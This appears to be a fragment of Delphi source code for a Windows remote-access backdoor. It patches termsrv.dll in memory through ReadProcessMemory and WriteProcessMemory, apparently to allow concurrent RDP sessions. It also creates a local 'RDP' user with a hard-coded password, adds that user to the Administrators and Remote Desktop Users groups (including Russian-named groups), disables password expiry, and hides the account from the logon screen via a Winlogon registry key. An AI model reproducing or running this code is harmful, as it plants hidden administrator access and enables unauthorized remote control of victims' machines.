  ...
  if TSPid > 0 then begin
    ...
    if GetModuleAddress('termsrv.dll', TSPid, Base, Sz) then begin
      ...
      if hProc=0 then begin
        ...
        M:=TMemoryStream.Create;
        M.SetSize(Sz);
        if not ReadProcessMemory(hProc, Base, M.Memory, Sz, hProc) then begin
          CloseHandle(hProc);
          M.Free;
          E:=GetLastError;
...
begin
  ...
  ////////////////////////////
    WriteLog('[*] Configuring User RDP Add...'); //net user User1 /delete
    ExecAppAndWait('net user RDP 852456 /add', GetSystem+'system32');
    WriteLog('[*] Configuring User Group Admin Add...');
    ExecAppAndWait('net localgroup Administrators RDP /add', GetSystem+'system32');
    ExecAppAndWait('net localgroup Àäìèíèñòðàòîðû RDP /add', GetSystem+'system32');
    WriteLog('[*] Configuring Remote Desktop Users Add...');
    ExecAppAndWait('net localgroup "Remote Desktop Users" RDP /add', GetSystem+'system32');
    ExecAppAndWait('net localgroup "Ïîëüçîâàòåëè óäàëåííîãî ðàáî÷åãî ñòîëà" RDP /add', GetSystem+'system32');
    WriteLog('[*] Configuring Maxpwage:Unlimited Add...');
    ExecAppAndWait('net accounts /maxpwage:unlimited', GetSystem+'system32');
    if R.OpenKey('SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList', true) then begin
    try
      R.writeinteger('RDP', 0);
    except
      WriteLog('[-] Hide User RDP');
    end;
    R.CloseKey;
    end;
  ////////////////////////////
        ...
        if not ReadProcessMemory(hProc, Base, M.Memory, Sz, hProc) then begin
          ...
          if not SearchSignatures then begin
            ...
            if hProc=0 then begin
              ...
              if not WriteProcessMemory(hProc, Pointer(Cardinal(Base)+Off1), @Val1, 1, hProc) then begin
                E:=GetLastError;
                WriteLog('[-] Can''t write process memory (Error code: '+IntToStr(E)+', '+SysErrorMessage(E)+')');
              end;
              if not WriteProcessMemory(hProc, Pointer(Cardinal(Base)+Off2), @Val2, 1, hProc) then begin
                E:=GetLastError;
                WriteLog('[-] Can''t write process memory (Error code: '+IntToStr(E)+', '+SysErrorMessage(E)+')');
              end;
              if not WriteProcessMemory(hProc, Pointer(Cardinal(Base)+Off3), @Val3, 2, hProc) then begin
                E:=GetLastError;
                WriteLog('[-] Can''t write process memory (Error code: '+IntToStr(E)+', '+SysErrorMessage(E)+')');
              end;
              CloseHandle(hProc);
